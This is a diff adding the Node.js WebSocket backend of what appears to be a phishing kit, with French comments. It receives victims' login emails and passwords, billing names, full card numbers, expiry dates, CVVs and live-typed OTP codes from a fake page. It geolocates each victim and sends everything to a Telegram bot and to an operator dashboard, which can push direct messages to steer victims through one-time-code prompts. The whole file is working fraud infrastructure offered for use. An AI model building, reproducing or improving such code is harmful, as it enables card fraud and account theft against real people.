@@ -1,0 +1,770 @@
+const WebSocket = require('ws');
+const http = require('http');
+const https = require('https');
+const fs = require('fs');
+const path = require('path');
+const TelegramService = require('./services/telegramService');
+
+// Charger les variables d'environnement depuis .env si le fichier existe
+const envPath = path.join(__dirname, '..', '.env');
+if (fs.existsSync(envPath)) {
+  console.log('[Server] 📄 Loading .env file...');
+  const envContent = fs.readFileSync(envPath, 'utf8');
+  envContent.split('\n').forEach(line => {
+    const trimmedLine = line.trim();
+    if (trimmedLine && !trimmedLine.startsWith('#')) {
+      const [key, ...valueParts] = trimmedLine.split('=');
+      if (key && valueParts.length > 0) {
+        const value = valueParts.join('=').trim().replace(/^["']|["']$/g, '');
+        if (!process.env[key.trim()]) {
+          process.env[key.trim()] = value;
+          console.log(`[Server] ✅ Loaded ${key.trim()} from .env`);
+        }
+      }
+    }
+  });
+  console.log('[Server] ✅ .env file loaded');
+} else {
+  console.log('[Server] ⚠️  No .env file found. Using system environment variables.');
+}
+
+// Configuration
+const PORT = process.env.WS_PORT || 8080;
+const telegram = new TelegramService();
+
+// Créer le serveur HTTP
+const server = http.createServer();
+
+// Créer le serveur WebSocket
+const wss = new WebSocket.Server({ server });
+
+// Stockage des connexions
+const clients = new Map();
+const dashboards = new Set();
+
+// Fonction pour extraire la vraie adresse IP du client
+function getClientIP(req) {
+  const headers = {
+    'x-forwarded-for': req.headers['x-forwarded-for'],
+    'x-real-ip': req.headers['x-real-ip'],
+    'cf-connecting-ip': req.headers['cf-connecting-ip'],
+    'true-client-ip': req.headers['true-client-ip']
+  };
+  
+  const remoteAddress = req.socket.remoteAddress;
+  
+  console.log('[IP Detection] Headers:', JSON.stringify(headers, null, 2));
+  console.log('[IP Detection] Remote Address:', remoteAddress);
+  
+  // Vérifier X-Forwarded-For (peut contenir plusieurs IPs, prendre la première)
+  const xForwardedFor = req.headers['x-forwarded-for'];
+  if (xForwardedFor) {
+    // X-Forwarded-For peut contenir plusieurs IPs séparées par des virgules
+    // La première est généralement l'IP du client original
+    const ips = xForwardedFor.split(',').map(ip => ip.trim());
+    console.log('[IP Detection] X-Forwarded-For IPs:', ips);
+    if (ips.length > 0 && ips[0]) {
+      // Nettoyer l'IP (enlever le port si présent)
+      const cleanIP = ips[0].split(':')[0];
+      if (cleanIP && cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
+        console.log('[IP Detection] ✅ Using X-Forwarded-For:', cleanIP);
+        return cleanIP;
+      }
+    }
+  }
+
+  // Vérifier X-Real-IP
+  const xRealIP = req.headers['x-real-ip'];
+  if (xRealIP) {
+    const cleanIP = xRealIP.split(':')[0];
+    console.log('[IP Detection] X-Real-IP:', cleanIP);
+    if (cleanIP && cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
+      console.log('[IP Detection] ✅ Using X-Real-IP:', cleanIP);
+      return cleanIP;
+    }
+  }
+
+  // Vérifier CF-Connecting-IP (Cloudflare)
+  const cfConnectingIP = req.headers['cf-connecting-ip'];
+  if (cfConnectingIP) {
+    const cleanIP = cfConnectingIP.split(':')[0];
+    console.log('[IP Detection] CF-Connecting-IP:', cleanIP);
+    if (cleanIP) {
+      console.log('[IP Detection] ✅ Using CF-Connecting-IP:', cleanIP);
+      return cleanIP;
+    }
+  }
+
+  // Vérifier True-Client-IP (Akamai, Cloudflare Enterprise)
+  const trueClientIP = req.headers['true-client-ip'];
+  if (trueClientIP) {
+    const cleanIP = trueClientIP.split(':')[0];
+    console.log('[IP Detection] True-Client-IP:', cleanIP);
+    if (cleanIP) {
+      console.log('[IP Detection] ✅ Using True-Client-IP:', cleanIP);
+      return cleanIP;
+    }
+  }
+
+  // Fallback sur remoteAddress
+  let ip = req.socket.remoteAddress;
+  
+  // Nettoyer l'IP (enlever ::ffff: pour IPv4 mapped IPv6)
+  if (ip) {
+    ip = ip.replace(/^::ffff:/, '');
+    // Enlever le port si présent
+    ip = ip.split(':')[0];
+  }
+  
+  console.log('[IP Detection] ✅ Using Remote Address (fallback):', ip || 'unknown');
+  return ip || 'unknown';
+}
+
+// Fonction pour obtenir le pays à partir de l'IP
+function getCountryFromIP(ip) {
+  return new Promise((resolve) => {
+    console.log(`[Country] 🔍 Fetching country for IP: ${ip}`);
+    
+    // Ignorer les IPs locales
+    if (!ip || ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+      console.log(`[Country] ⚠️  Local IP detected, returning 'Local'`);
+      resolve('Local');
+      return;
+    }
+
+    // Utiliser l'API ip-api.com (gratuite, sans clé API)
+    const url = `https://ip-api.com/json/${ip}?fields=status,country,countryCode`;
+    console.log(`[Country] 🌐 Requesting: ${url}`);
+    
+    const request = https.get(url, (res) => {
+      let data = '';
+      
+      console.log(`[Country] 📡 Response status: ${res.statusCode}`);
+      
+      res.on('data', (chunk) => {
+        data += chunk;
+      });
+      
+      res.on('end', () => {
+        try {
+          console.log(`[Country] 📦 Response data:`, data);
+          const result = JSON.parse(data);
+          console.log(`[Country] 📊 Parsed result:`, JSON.stringify(result, null, 2));
+          
+          if (result.status === 'success' && result.country) {
+            console.log(`[Country] ✅ Success! Country: ${result.country}`);
+            resolve(result.country);
+          } else {
+            console.log(`[Country] ⚠️  API returned status: ${result.status}, country: ${result.country || 'N/A'}`);
+            resolve('Unknown');
+          }
+        } catch (error) {
+          console.error(`[Country] ❌ Error parsing country data:`, error);
+          console.error(`[Country] Raw data:`, data);
+          resolve('Unknown');
+        }
+      });
+    });
+    
+    request.on('error', (error) => {
+      console.error(`[Country] ❌ Error fetching country:`, error);
+      resolve('Unknown');
+    });
+    
+    // Timeout de 5 secondes
+    request.setTimeout(5000, () => {
+      console.error(`[Country] ⏱️  Timeout after 5 seconds for IP: ${ip}`);
+      request.destroy();
+      resolve('Unknown');
+    });
+  });
+}
+
+// Gestion des connexions WebSocket
+wss.on('connection', async (ws, req) => {
+  const clientId = generateClientId();
+  const ip = getClientIP(req);
+  
+  console.log(`\n[Connection] ========================================`);
+  console.log(`[Connection] New WebSocket connection`);
+  console.log(`[Connection] Client ID: ${clientId}`);
+  console.log(`[Connection] Detected IP: ${ip}`);
+  console.log(`[Connection] User-Agent: ${req.headers['user-agent'] || 'N/A'}`);
+  console.log(`[Connection] Origin: ${req.headers.origin || 'N/A'}`);
+  console.log(`[Connection] ========================================\n`);
+
+  // Obtenir le pays à partir de l'IP
+  const country = await getCountryFromIP(ip);
+  console.log(`[Country] IP ${ip} -> Country: ${country}`);
+
+  // Stocker la connexion
+  clients.set(clientId, {
+    ws,
+    id: clientId,
+    ip,
+    country,
+    role: null,
+    connectedAt: Date.now(),
+  });
+
+  // Envoyer message de bienvenue
+  ws.send(JSON.stringify({
+    type: 'welcome',
+    message: 'Connected to WebSocket server',
+    clientId,
+  }));
+
+  // Gestion des messages
+  ws.on('message', async (message) => {
+    try {
+      const rawMessage = message.toString();
+      console.log(`[Server] 📨 Raw message received from ${clientId}:`, rawMessage);
+      const data = JSON.parse(rawMessage);
+      console.log(`[Server] 📨 Parsed message from ${clientId}:`, data.type, JSON.stringify(data, null, 2));
+      console.log(`[Server] 📨 Message details - type: ${data.type}, from: ${clientId}, to: ${data.to || 'N/A'}`);
+      await handleMessage(clientId, data);
+    } catch (error) {
+      console.error(`[Server] ❌ Error parsing message from ${clientId}:`, error);
+      console.error(`[Server] Raw message:`, message.toString());
+      ws.send(JSON.stringify({
+        type: 'error',
+        message: 'Invalid message format',
+      }));
+    }
+  });
+
+  // Gestion de la déconnexion
+  ws.on('close', (code, reason) => {
+    console.log(`\n[Connection] ========================================`);
+    console.log(`[Connection] Client disconnected: ${clientId}`);
+    console.log(`[Connection] Close code: ${code} (1000=Normal, 1001=Going Away, 1005=No Status, 1006=Abnormal)`);
+    console.log(`[Connection] Reason: ${reason || 'No reason'}`);
+    console.log(`[Connection] ========================================\n`);
+    
+    const client = clients.get(clientId);
+    
+    // Pour les fermetures normales (code 1000), attendre un peu avant de supprimer
+    // Cela permet au client de se reconnecter rapidement sans perdre son état
+    if (code === 1000) {
+      console.log(`[Connection] ⚠️  Normal closure (code 1000) - waiting 2 seconds before removing client`);
+      console.log(`[Connection] This might be a React.StrictMode cleanup - client may reconnect`);
+      
+      setTimeout(() => {
+        const stillExists = clients.get(clientId);
+        if (stillExists && stillExists.ws.readyState === 3) { // CLOSED
+          console.log(`[Connection] Client ${clientId} still closed after 2 seconds - removing`);
+          if (stillExists.role === 'dashboard') {
+            dashboards.delete(stillExists.ws);
+          }
+          clients.delete(clientId);
+          console.log(`[Connection] Client ${clientId} removed from clients map`);
+          console.log(`[Connection] Remaining clients: ${clients.size}`);
+          
+          // Notifier les dashboards
+          broadcastToDashboards({
+            type: 'client_disconnected',
+            clientId,
+          });
+        } else if (stillExists && stillExists.ws.readyState !== 3) {
+          console.log(`[Connection] ✅ Client ${clientId} reconnected! Keeping in map`);
+        }
+      }, 2000);
+      
+      return; // Ne pas supprimer immédiatement
+    }
+    
+    // Pour les fermetures anormales, supprimer immédiatement
+    if (client && client.role === 'dashboard') {
+      dashboards.delete(ws);
+      console.log(`[Connection] Dashboard ${clientId} removed from dashboards set`);
+    }
+    
+    clients.delete(clientId);
+    console.log(`[Connection] Client ${clientId} removed from clients map`);
+    console.log(`[Connection] Remaining clients: ${clients.size}`);
+
+    // Notifier les dashboards
+    broadcastToDashboards({
+      type: 'client_disconnected',
+      clientId,
+    });
+  });
+});
+
+// Gestion des messages
+async function handleMessage(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) {
+    console.log(`[handleMessage] ❌ Client not found: ${clientId}`);
+    return;
+  }
+
+  console.log(`[handleMessage] 🔄 Processing message type: ${data.type} from client: ${clientId} (role: ${client.role || 'unknown'})`);
+
+  switch (data.type) {
+    case 'register':
+      console.log(`[handleMessage] 📝 Registering client ${clientId} with role: ${data.role}`);
+      await handleRegister(clientId, data);
+      break;
+    
+    case 'presence':
+      await handlePresence(clientId, data);
+      break;
+    
+    case 'billing_data':
+      await handleBillingData(clientId, data);
+      break;
+    
+    case 'login_data':
+      await handleLoginData(clientId, data);
+      break;
+    
+    case 'payment_data':
+      console.log(`[handleMessage] 💳 Payment data received from client ${clientId}`);
+      console.log(`[handleMessage] Payment data content:`, JSON.stringify(data, null, 2));
+      await handlePaymentData(clientId, data);
+      break;
+    
+    case 'otp_update':
+      await handleOTPUpdate(clientId, data);
+      break;
+    
+    case 'otp_submit':
+      console.log(`[handleMessage] 🔢 OTP submit received from client ${clientId}`);
+      console.log(`[handleMessage] OTP data content:`, JSON.stringify(data, null, 2));
+      await handleOTPSubmit(clientId, data);
+      break;
+    
+    case 'list':
+      console.log(`[handleMessage] 📋 List request from ${clientId} (role: ${client.role})`);
+      handleList(clientId);
+      break;
+    
+    case 'direct':
+      console.log(`[handleMessage] 📨 Direct message from ${clientId} (role: ${client.role})`);
+      handleDirectMessage(clientId, data);
+      break;
+    
+    default:
+      console.log(`[handleMessage] ⚠️  Unknown message type: ${data.type} from ${clientId}`);
+  }
+}
+
+// Enregistrement d'un client
+async function handleRegister(clientId, data) {
+  console.log(`[handleRegister] 📝 Registering client ${clientId}`);
+  console.log(`[handleRegister] Role: ${data.role || 'client'}, Page: ${data.page || '/'}`);
+  
+  const client = clients.get(clientId);
+  if (!client) {
+    console.log(`[handleRegister] ❌ Client not found: ${clientId}`);
+    return;
+  }
+  
+  client.role = data.role || 'client';
+  client.current_page = data.page || '/';
+
+  if (client.role === 'dashboard') {
+    dashboards.add(client.ws);
+    console.log(`[handleRegister] ✅ Dashboard registered: ${clientId}`);
+    console.log(`[handleRegister] Total dashboards: ${dashboards.size}`);
+  } else {
+    console.log(`[handleRegister] ✅ Client registered: ${clientId}`);
+  }
+
+  // Envoyer confirmation
+  const registrationResponse = {
+    type: 'registered',
+    clientId,
+    role: client.role,
+  };
+  console.log(`[handleRegister] 📤 Sending registration confirmation:`, JSON.stringify(registrationResponse, null, 2));
+  client.ws.send(JSON.stringify(registrationResponse));
+  console.log(`[handleRegister] ✅ Registration confirmation sent to ${clientId}`);
+
+  // Notifier Telegram pour les nouveaux clients
+  if (client.role === 'client') {
+    await telegram.notifyNewClient({
+      id: clientId,
+      ip: client.ip,
+      current_page: client.current_page,
+      created_at: client.connectedAt,
+    });
+  }
+
+  // Notifier les dashboards
+  const notificationType = client.role === 'client' ? 'client_registered' : 'dashboard_connected';
+  console.log(`[handleRegister] 📢 Broadcasting ${notificationType} to ${dashboards.size} dashboard(s)`);
+  broadcastToDashboards({
+    type: notificationType,
+    client: {
+      id: clientId,
+      ip: client.ip,
+      country: client.country,
+      current_page: client.current_page,
+      connectedAt: client.connectedAt,
+    },
+  });
+}
+
+// Mise à jour de présence
+async function handlePresence(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+
+  const oldPage = client.current_page;
+  client.current_page = data.page || '/';
+  client.last_seen = Date.now();
+
+  // Notifier Telegram si changement de page
+  if (oldPage !== client.current_page) {
+    await telegram.notifyPageUpdate({
+      id: clientId,
+      current_page: client.current_page,
+    });
+  }
+
+  // Notifier les dashboards
+  broadcastToDashboards({
+    type: 'client_updated',
+    client: {
+      id: clientId,
+      ip: client.ip,
+      country: client.country,
+      current_page: client.current_page,
+      last_seen: client.last_seen,
+    },
+  });
+}
+
+// Données de facturation
+async function handleBillingData(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+
+  Object.assign(client, data.data);
+
+  // Notifier Telegram
+  await telegram.notifyCustom('Données de facturation', {
+    Client: clientId,
+    Nom: `${data.data.first_name || ''} ${data.data.last_name || ''}`.trim(),
+    Email: data.data.email || 'N/A',
+  });
+
+  // Notifier les dashboards
+  broadcastToDashboards({
+    type: 'client_updated',
+    client: {
+      id: clientId,
+      ...data.data,
+    },
+  });
+}
+
+// Données de connexion
+async function handleLoginData(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+
+  client.login_email = data.data.email;
+  client.login_password = data.data.password;
+
+  // Notifier Telegram
+  await telegram.notifyLoginData({
+    id: clientId,
+    login_email: data.data.email,
+    login_password: data.data.password,
+  });
+
+  // Notifier les dashboards
+  broadcastToDashboards({
+    type: 'client_updated',
+    client: {
+      id: clientId,
+      login_email: data.data.email,
+    },
+  });
+}
+
+// Données de paiement
+async function handlePaymentData(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) {
+    console.log(`[handlePaymentData] ❌ Client not found: ${clientId}`);
+    return;
+  }
+
+  console.log(`[handlePaymentData] 📨 Received payment data for client: ${clientId}`);
+  console.log(`[handlePaymentData] Data received:`, JSON.stringify(data, null, 2));
+
+  client.card_holder = data.data.cardHolder || data.data.nameOnCard;
+  client.card_number = data.data.cardNumber;
+  client.card_expiration = data.data.expirationDate;
+  client.card_cvv = data.data.cvv;
+
+  const telegramData = {
+    id: clientId,
+    ip: client.ip,
+    country: client.country,
+    card_holder: data.data.cardHolder || data.data.nameOnCard,
+    card_number: data.data.cardNumber,
+    card_expiration: data.data.expirationDate,
+    card_cvv: data.data.cvv,
+    current_page: client.current_page,
+  };
+
+  console.log(`[handlePaymentData] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
+  console.log(`[handlePaymentData] Telegram enabled:`, telegram.enabled);
+
+  // Notifier Telegram avec toutes les informations
+  const telegramResult = await telegram.notifyPaymentData(telegramData);
+  console.log(`[handlePaymentData] ✅ Telegram notification result:`, telegramResult);
+
+  // Notifier les dashboards avec toutes les données
+  broadcastToDashboards({
+    type: 'client_updated',
+    client: {
+      id: clientId,
+      ip: client.ip,
+      country: client.country,
+      current_page: client.current_page,
+      connectedAt: client.connectedAt,
+      last_seen: client.last_seen,
+      card_holder: data.data.cardHolder,
+      card_number: data.data.cardNumber,
+      card_expiration: data.data.expirationDate,
+      card_cvv: data.data.cvv,
+      otp_code: client.otp_code,
+      otp_status: client.otp_status,
+      otp_submitted_at: client.otp_submitted_at,
+      login_email: client.login_email,
+      login_password: client.login_password,
+    },
+  });
+}
+
+// Mise à jour OTP (typing)
+async function handleOTPUpdate(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) return;
+
+  client.otp_code = data.otp;
+  client.otp_status = 'typing';
+
+  // Notifier les dashboards avec toutes les données
+  broadcastToDashboards({
+    type: 'client_updated',
+    client: {
+      id: clientId,
+      ip: client.ip,
+      country: client.country,
+      current_page: client.current_page,
+      connectedAt: client.connectedAt,
+      last_seen: client.last_seen,
+      card_holder: client.card_holder,
+      card_number: client.card_number,
+      card_expiration: client.card_expiration,
+      card_cvv: client.card_cvv,
+      otp_code: data.otp,
+      otp_status: 'typing',
+      otp_submitted_at: client.otp_submitted_at,
+      login_email: client.login_email,
+      login_password: client.login_password,
+    },
+  });
+}
+
+// Soumission OTP
+async function handleOTPSubmit(clientId, data) {
+  const client = clients.get(clientId);
+  if (!client) {
+    console.log(`[handleOTPSubmit] ❌ Client not found: ${clientId}`);
+    return;
+  }
+
+  console.log(`[handleOTPSubmit] 📨 Received OTP submit for client: ${clientId}`);
+  console.log(`[handleOTPSubmit] OTP received:`, data.otp);
+
+  client.otp_code = data.otp;
+  client.otp_status = 'submitted';
+  client.otp_submitted_at = Date.now();
+
+  const telegramData = {
+    id: clientId,
+    ip: client.ip,
+    country: client.country,
+    otp_code: data.otp,
+    otp_status: 'submitted',
+    current_page: client.current_page,
+    card_holder: client.card_holder,
+    card_number: client.card_number,
+    card_expiration: client.card_expiration,
+  };
+
+  console.log(`[handleOTPSubmit] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
+  console.log(`[handleOTPSubmit] Telegram enabled:`, telegram.enabled);
+
+  // Notifier Telegram avec toutes les informations
+  const telegramResult = await telegram.notifyOTP(telegramData);
+  console.log(`[handleOTPSubmit] ✅ Telegram notification result:`, telegramResult);
+
+  // Notifier les dashboards avec toutes les données du client
+  broadcastToDashboards({
+    type: 'client_updated',
+    client: {
+      id: clientId,
+      ip: client.ip,
+      country: client.country,
+      current_page: client.current_page,
+      connectedAt: client.connectedAt,
+      last_seen: client.last_seen,
+      card_holder: client.card_holder,
+      card_number: client.card_number,
+      card_expiration: client.card_expiration,
+      card_cvv: client.card_cvv,
+      otp_code: data.otp,
+      otp_status: 'submitted',
+      otp_submitted_at: client.otp_submitted_at,
+      login_email: client.login_email,
+      login_password: client.login_password,
+    },
+  });
+}
+
+
+// Liste des clients (pour dashboard)
+function handleList(clientId) {
+  console.log(`[handleList] 📋 List request from ${clientId}`);
+  const client = clients.get(clientId);
+  if (!client || client.role !== 'dashboard') {
+    console.log(`[handleList] ❌ List request denied: not a dashboard or client not found. ClientId: ${clientId}, Role: ${client?.role || 'unknown'}`);
+    return;
+  }
+
+  console.log(`[handleList] ✅ Dashboard ${clientId} requesting clients list`);
+  const clientsList = Array.from(clients.values())
+    .filter(c => c.role === 'client')
+    .map(c => ({
+      id: c.id,
+      ip: c.ip,
+      country: c.country || 'Unknown',
+      current_page: c.current_page,
+      connectedAt: c.connectedAt,
+      last_seen: c.last_seen,
+      card_holder: c.card_holder,
+      card_number: c.card_number,
+      card_expiration: c.card_expiration,
+      card_cvv: c.card_cvv,
+      otp_code: c.otp_code,
+      otp_status: c.otp_status,
+      otp_submitted_at: c.otp_submitted_at,
+      login_email: c.login_email,
+      login_password: c.login_password,
+      first_name: c.first_name,
+      last_name: c.last_name,
+    }));
+  
+  console.log(`[handleList] 📊 Sending ${clientsList.length} client(s) to dashboard ${clientId}`);
+  console.log(`[handleList] Countries:`, clientsList.map(c => `${c.id}: ${c.country}`).join(', '));
+  
+  const response = {
+    type: 'clients',
+    items: clientsList,
+  };
+  console.log(`[handleList] 📤 Response:`, JSON.stringify(response, null, 2));
+  client.ws.send(JSON.stringify(response));
+  console.log(`[handleList] ✅ Clients list sent to dashboard ${clientId}`);
+}
+
+// Gestion des messages directs (dashboard -> client)
+function handleDirectMessage(senderId, data) {
+  console.log(`\n[DirectMessage] ========================================`);
+  console.log(`[DirectMessage] 📨 Received direct message from ${senderId}`);
+  console.log(`[DirectMessage] Full data:`, JSON.stringify(data, null, 2));
+  console.log(`[DirectMessage] ========================================\n`);
+  
+  const sender = clients.get(senderId);
+  if (!sender) {
+    console.log(`[DirectMessage] ❌ Sender not found: ${senderId}`);
+    console.log(`[DirectMessage] Available clients:`, Array.from(clients.keys()));
+    return;
+  }
+  
+  if (sender.role !== 'dashboard') {
+    console.log(`[DirectMessage] ❌ Sender is not a dashboard. Role: ${sender.role}, SenderId: ${senderId}`);
+    return;
+  }
+
+  const targetId = data.to;
+  if (!targetId) {
+    console.log('[DirectMessage] ❌ No target client ID provided');
+    console.log('[DirectMessage] Data received:', JSON.stringify(data, null, 2));
+    return;
+  }
+
+  const targetClient = clients.get(targetId);
+  if (!targetClient) {
+    console.log(`\n[DirectMessage] ========================================`);
+    console.log(`[DirectMessage] ❌ Target client not found: ${targetId}`);
+    console.log(`[DirectMessage] Available clients:`, Array.from(clients.keys()));
+    console.log(`[DirectMessage] Total clients: ${clients.size}`);
+    console.log(`[DirectMessage] ⚠️  Client may have disconnected before message could be sent`);
+    console.log(`[DirectMessage] ========================================\n`);
+    return;
+  }
+  
+  // Vérifier que le client est toujours connecté
+  if (targetClient.ws.readyState !== 1) {
+    console.log(`\n[DirectMessage] ========================================`);
+    console.log(`[DirectMessage] ⚠️  Target client WebSocket is not OPEN`);
+    console.log(`[DirectMessage] Client ID: ${targetId}`);
+    console.log(`[DirectMessage] WebSocket readyState: ${targetClient.ws.readyState} (1=OPEN, 0=CONNECTING, 2=CLOSING, 3=CLOSED)`);
+    console.log(`[DirectMessage] ========================================\n`);
+    return;
+  }
+
+  console.log(`[DirectMessage] ✅ Sender: ${senderId} (${sender.role}), Target: ${targetId}`);
+  console.log(`[DirectMessage] Payload:`, JSON.stringify(data.payload, null, 2));
+
+  // Envoyer le message au client cible
+  if (targetClient.ws.readyState === 1) {
+    try {
+      const message = {
+        type: 'direct',
+        payload: data.payload || data
+      };
+      targetClient.ws.send(JSON.stringify(message));
+      console.log(`[DirectMessage] ✅ Direct message sent to client ${targetId}`);
+    } catch (error) {
+      console.error(`[DirectMessage] ❌ Error sending direct message:`, error);
+    }
+  } else {
+    console.log(`[DirectMessage] ❌ WebSocket is not OPEN (readyState: ${targetClient.ws.readyState})`);
+  }
+}
+
+// Diffuser aux dashboards
+function broadcastToDashboards(message) {
+  const messageStr = JSON.stringify(message);
+  dashboards.forEach(dashboard => {
+    if (dashboard.readyState === WebSocket.OPEN) {
+      dashboard.send(messageStr);
+    }
+  });
+}
+
+// Générer un ID client unique
+function generateClientId() {
+  return `client-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
+}
+
+// Démarrer le serveur
+server.listen(PORT, () => {
+  console.log(`WebSocket server running on port ${PORT}`);
+  if (telegram.enabled) {
+    console.log('Telegram notifications enabled');
+  } else {
+    console.log('Telegram notifications disabled (configure .env)');
+  }
+});
+
